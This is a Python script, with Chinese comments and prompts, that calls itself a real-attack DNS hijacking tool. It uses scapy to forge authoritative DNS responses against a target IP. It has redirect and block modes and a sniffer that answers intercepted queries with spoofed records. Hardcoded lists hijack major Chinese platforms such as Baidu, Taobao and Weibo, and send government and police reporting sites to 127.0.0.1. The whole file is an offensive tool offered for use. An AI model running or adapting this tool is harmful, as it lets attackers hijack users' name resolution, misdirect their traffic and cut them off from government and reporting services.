#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
精准目标DNS攻击工具 - 真实攻击版本
支持真实的DNS劫持和重定向攻击
"""

import threading
import time
import re
import socket
import struct
from scapy.all import *

class TargetedDNSAttack:
    def __init__(self):
        self.attack_running = False
        
        # 配置参数
        self.config = {
            'target_ip': '',
            'attack_type': 'redirect',
            'duration': 300,
            'threads': 5,
            'redirect_ip': '8.8.8.8',
            'domains': 'baidu.com,qq.com,taobao.com'
        }
        
        # 统计信息
        self.stats = {
            'packets_sent': 0,
            'domains_affected': 0,
            'start_time': None
        }
        
        # 国内平台重定向规则（针对目标）
        self.china_platforms = {
            # 电视平台
            "iqiyi.com": "1.1.1.1",           # 爱奇艺 -> Cloudflare
            "youku.com": "8.8.8.8",           # 优酷 -> 谷歌DNS
            "bilibili.com": "8.8.8.8",       # B站 -> 谷歌DNS
            "douyin.com": "208.67.222.222",   # 抖音 -> OpenDNS
            "kuaishou.com": "1.1.1.1",       # 快手 -> Cloudflare
            
            # 搜索引擎
            "baidu.com": "8.8.8.8",          # 百度 -> 谷歌DNS
            "sogou.com": "1.1.1.1",          # 搜狗 -> Cloudflare
            "so.com": "208.67.222.222",      # 360搜索 -> OpenDNS
            
            # 传媒平台
            "sina.com.cn": "8.8.8.8",        # 新浪 -> 谷歌DNS
            "sohu.com": "1.1.1.1",           # 搜狐 -> Cloudflare
            "163.com": "208.67.222.222",     # 网易 -> OpenDNS
            "qq.com": "8.8.8.8",             # 腾讯网 -> 谷歌DNS
            
            # 电商平台
            "taobao.com": "8.8.8.8",         # 淘宝 -> 谷歌DNS
            "jd.com": "208.67.222.222",      # 京东 -> OpenDNS
            "pinduoduo.com": "8.8.8.8",      # 拼多多 -> 谷歌DNS
            
            # 社交平台
            "weibo.com": "1.1.1.1",          # 微博 -> Cloudflare
            "zhihu.com": "208.67.222.222",   # 知乎 -> OpenDNS
            "toutiao.com": "8.8.8.8",        # 今日头条 -> 谷歌DNS
        }
        
        # 完全屏蔽的网站（重定向到无效IP）
        self.blocked_sites = [
            "gov.cn", "12377.cn", "12321.cn", "beian.gov.cn",
            "police.gov.cn", "court.gov.cn", "procuratorate.gov.cn"
        ]
    
    def get_configuration(self):
        """获取用户自定义配置"""
        print("=" * 60)
        print("          定向DNS攻击工具 - 真实攻击版本")
        print("=" * 60)
        
        # 目标IP配置
        while True:
            target_ip = input("请输入目标IP地址 (例如: 10.30.58.185): ").strip()
            if self.validate_ip(target_ip):
                self.config['target_ip'] = target_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 攻击类型配置
        while True:
            attack_type = input("请输入攻击类型 (redirect/block) (默认redirect): ").strip().lower()
            if attack_type in ['redirect', 'block']:
                self.config['attack_type'] = attack_type
                break
            elif not attack_type:
                self.config['attack_type'] = 'redirect'
                break
            else:
                print("❌ 请输入 redirect 或 block")
        
        # 攻击时长配置
        while True:
            try:
                duration = int(input("请输入攻击时长(秒) (默认300): ").strip() or "300")
                if duration > 0:
                    self.config['duration'] = duration
                    break
                else:
                    print("❌ 时长必须大于0")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 线程数配置
        while True:
            try:
                threads = int(input("请输入线程数 (默认5): ").strip() or "5")
                if 1 <= threads <= 20:
                    self.config['threads'] = threads
                    break
                else:
                    print("❌ 线程数必须在1-20之间")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 重定向IP配置
        while True:
            redirect_ip = input("请输入重定向IP (例如: 8.8.8.8): ").strip()
            if self.validate_ip(redirect_ip):
                self.config['redirect_ip'] = redirect_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 域名列表配置
        while True:
            domains = input("请输入要攻击的域名列表 (用逗号分隔，例如: baidu.com,qq.com): ").strip()
            if domains:
                self.config['domains'] = domains
                break
            else:
                print("❌ 域名列表不能为空")
        
        return self.show_configuration()
    
    def validate_ip(self, ip):
        """验证IP地址格式"""
        pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return re.match(pattern, ip) is not None
    
    def show_configuration(self):
        """显示配置信息并请求确认"""
        print("\n" + "=" * 60)
        print("          配置确认")
        print("=" * 60)
        print(f"目标IP: {self.config['target_ip']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"攻击时长: {self.config['duration']}秒")
        print(f"线程数: {self.config['threads']}")
        print(f"重定向IP: {self.config['redirect_ip']}")
        print(f"攻击域名: {self.config['domains']}")
        print("=" * 60)
        
        # 请求用户确认
        while True:
            confirm = input("\n确认执行定向DNS攻击? (Y/N): ").strip().upper()
            if confirm == 'Y':
                return True
            elif confirm == 'N':
                print("❌ 攻击已取消")
                return False
            else:
                print("❌ 请输入 Y 或 N")
    
    def start_attack(self):
        """开始定向DNS攻击"""
        print("=" * 60)
        print("          定向DNS攻击开始")
        print("=" * 60)
        print(f"目标IP: {self.config['target_ip']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"攻击时长: {self.config['duration']}秒")
        print(f"线程数: {self.config['threads']}")
        print(f"重定向IP: {self.config['redirect_ip']}")
        print(f"攻击域名: {self.config['domains']}")
        print("=" * 60)
        
        self.attack_running = True
        self.stats['start_time'] = time.time()
        self.stats['packets_sent'] = 0
        self.stats['domains_affected'] = 0
        
        # 解析域名列表
        domains_list = [domain.strip() for domain in self.config['domains'].split(',')]
        
        try:
            # 根据攻击类型执行不同的攻击
            if self.config['attack_type'] == 'redirect':
                self.dns_redirect_attack(domains_list)
            elif self.config['attack_type'] == 'block':
                self.dns_block_attack(domains_list)
            
        except KeyboardInterrupt:
            print("\n[!] 用户中断攻击")
        except Exception as e:
            print(f"[-] 攻击错误: {e}")
        finally:
            self.stop_attack()
    
    def create_dns_response(self, query_packet, spoofed_ip):
        """创建DNS欺骗响应包"""
        try:
            # 提取查询信息
            if query_packet.haslayer(DNS):
                dns_query = query_packet[DNS]
                
                # 创建DNS响应包
                dns_response = IP(dst=query_packet[IP].src, src=query_packet[IP].dst) / \
                              UDP(dport=query_packet[UDP].sport, sport=53) / \
                              DNS(id=dns_query.id,
                                  qr=1,  # 响应
                                  aa=1,  # 权威答案
                                  qd=dns_query.qd,  # 查询部分
                                  an=DNSRR(rrname=dns_query.qd.qname,
                                          type='A',
                                          ttl=600,
                                          rdata=spoofed_ip))
                
                return dns_response
        except Exception as e:
            print(f"[-] 创建DNS响应包失败: {e}")
        
        return None
    
    def dns_redirect_attack(self, domains_list):
        """DNS重定向攻击 - 真实实现"""
        print("\n[+] 开始DNS重定向攻击...")
        print(f"   目标域名: {', '.join(domains_list)}")
        print(f"   重定向到: {self.config['redirect_ip']}")
        
        def send_dns_redirect():
            """发送DNS重定向包"""
            try:
                # 对每个域名构造DNS欺骗包
                for domain in domains_list:
                    # 构造DNS查询包
                    dns_query = IP(dst=self.config['target_ip']) / \
                               UDP(sport=12345, dport=53) / \
                               DNS(rd=1, qd=DNSQR(qname=domain))
                    
                    # 创建欺骗响应
                    spoofed_response = self.create_dns_response(dns_query, self.config['redirect_ip'])
                    
                    if spoofed_response:
                        # 发送欺骗包
                        send(spoofed_response, verbose=0)
                        self.stats['packets_sent'] += 1
                        self.stats['domains_affected'] += 1
                        print(f"[+] 对 {domain} 发送DNS重定向包 -> {self.config['redirect_ip']}")
                    
            except Exception as e:
                print(f"[-] DNS重定向失败: {e}")
        
        # 多线程攻击
        end_time = time.time() + self.config['duration']
        
        while self.attack_running and time.time() < end_time:
            threads = []
            
            for _ in range(self.config['threads']):
                if not self.attack_running:
                    break
                
                t = threading.Thread(target=send_dns_redirect)
                threads.append(t)
                t.start()
            
            # 等待线程完成
            for t in threads:
                t.join()
            
            time.sleep(2)  # 控制发送频率
    
    def dns_block_attack(self, domains_list):
        """DNS屏蔽攻击 - 真实实现"""
        print("\n[+] 开始DNS屏蔽攻击...")
        print(f"   目标域名: {', '.join(domains_list)}")
        print(f"   屏蔽到: 127.0.0.1 (本地回环)")
        
        def send_dns_block():
            """发送DNS屏蔽包"""
            try:
                # 对每个域名构造DNS屏蔽包
                for domain in domains_list:
                    # 构造DNS查询包
                    dns_query = IP(dst=self.config['target_ip']) / \
                               UDP(sport=12345, dport=53) / \
                               DNS(rd=1, qd=DNSQR(qname=domain))
                    
                    # 创建屏蔽响应
                    blocked_response = self.create_dns_response(dns_query, "127.0.0.1")
                    
                    if blocked_response:
                        # 发送屏蔽包
                        send(blocked_response, verbose=0)
                        self.stats['packets_sent'] += 1
                        self.stats['domains_affected'] += 1
                        print(f"[+] 对 {domain} 发送DNS屏蔽包 -> 127.0.0.1")
                    
            except Exception as e:
                print(f"[-] DNS屏蔽失败: {e}")
        
        # 多线程攻击
        end_time = time.time() + self.config['duration']
        
        while self.attack_running and time.time() < end_time:
            threads = []
            
            for _ in range(self.config['threads']):
                if not self.attack_running:
                    break
                
                t = threading.Thread(target=send_dns_block)
                threads.append(t)
                t.start()
            
            # 等待线程完成
            for t in threads:
                t.join()
            
            time.sleep(2)  # 控制发送频率
    
    def passive_dns_sniffing(self, domains_list):
        """被动DNS嗅探攻击"""
        print("\n[+] 启动被动DNS嗅探模式...")
        print("   监听DNS查询并实时劫持")
        
        def dns_sniffer(packet):
            """DNS数据包嗅探器"""
            if packet.haslayer(DNS) and packet.haslayer(DNSQR):
                query = packet[DNSQR].qname.decode()
                
                # 检查是否为目标域名
                for domain in domains_list:
                    if domain in query:
                        print(f"[+] 检测到DNS查询: {query}")
                        
                        # 创建欺骗响应
                        if self.config['attack_type'] == 'redirect':
                            spoofed_ip = self.config['redirect_ip']
                        else:
                            spoofed_ip = "127.0.0.1"
                        
                        spoofed_response = self.create_dns_response(packet, spoofed_ip)
                        
                        if spoofed_response:
                            send(spoofed_response, verbose=0)
                            self.stats['packets_sent'] += 1
                            self.stats['domains_affected'] += 1
                            print(f"[+] 劫持 {query} -> {spoofed_ip}")
        
        # 开始嗅探
        try:
            sniff(filter="udp port 53", prn=dns_sniffer, timeout=self.config['duration'])
        except Exception as e:
            print(f"[-] DNS嗅探失败: {e}")
    
    def advanced_dns_attack(self):
        """高级DNS攻击 - 针对国内平台"""
        print("\n[+] 启动高级DNS攻击模式...")
        print("   针对国内主流平台进行DNS劫持")
        
        # 显示攻击目标
        print("\n🔍 攻击目标列表:")
        for domain, redirect_ip in self.china_platforms.items():
            print(f"   {domain} -> {redirect_ip}")
        
        # 显示屏蔽目标
        print("\n🔒 屏蔽目标列表:")
        for domain in self.blocked_sites:
            print(f"   {domain} -> 127.0.0.1")
        
        def send_advanced_dns():
            """发送高级DNS攻击包"""
            try:
                # 对国内平台进行DNS劫持
                for domain, redirect_ip in self.china_platforms.items():
                    # 构造DNS查询包
                    dns_query = IP(dst=self.config['target_ip']) / \
                               UDP(sport=12345, dport=53) / \
                               DNS(rd=1, qd=DNSQR(qname=domain))
                    
                    # 创建欺骗响应
                    spoofed_response = self.create_dns_response(dns_query, redirect_ip)
                    
                    if spoofed_response:
                        send(spoofed_response, verbose=0)
                        self.stats['packets_sent'] += 1
                        self.stats['domains_affected'] += 1
                        print(f"[+] 劫持 {domain} -> {redirect_ip}")
                
                # 对屏蔽网站进行DNS屏蔽
                for domain in self.blocked_sites:
                    # 构造DNS查询包
                    dns_query = IP(dst=self.config['target_ip']) / \
                               UDP(sport=12345, dport=53) / \
                               DNS(rd=1, qd=DNSQR(qname=domain))
                    
                    # 创建屏蔽响应
                    blocked_response = self.create_dns_response(dns_query, "127.0.0.1")
                    
                    if blocked_response:
                        send(blocked_response, verbose=0)
                        self.stats['packets_sent'] += 1
                        self.stats['domains_affected'] += 1
                        print(f"[+] 屏蔽 {domain} -> 127.0.0.1")
                    
            except Exception as e:
                print(f"[-] 高级DNS攻击失败: {e}")
        
        # 多线程攻击
        end_time = time.time() + self.config['duration']
        
        while self.attack_running and time.time() < end_time:
            threads = []
            
            for _ in range(self.config['threads']):
                if not self.attack_running:
                    break
                
                t = threading.Thread(target=send_advanced_dns)
                threads.append(t)
                t.start()
            
            # 等待线程完成
            for t in threads:
                t.join()
            
            time.sleep(3)  # 控制发送频率
    
    def stop_attack(self):
        """停止攻击"""
        if self.attack_running:
            print("\n[+] 停止定向DNS攻击...")
            self.attack_running = False
            
            # 显示统计信息
            elapsed = time.time() - self.stats['start_time']
            print(f"\n[+] 攻击统计:")
            print(f"    - 总运行时间: {int(elapsed)}秒")
            print(f"    - 发送包数: {self.stats['packets_sent']}")
            print(f"    - 影响域名数: {self.stats['domains_affected']}")

def main():
    """主函数"""
    try:
        attack = TargetedDNSAttack()
        
        # 获取配置并确认
        if attack.get_configuration():
            attack.start_attack()
        
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()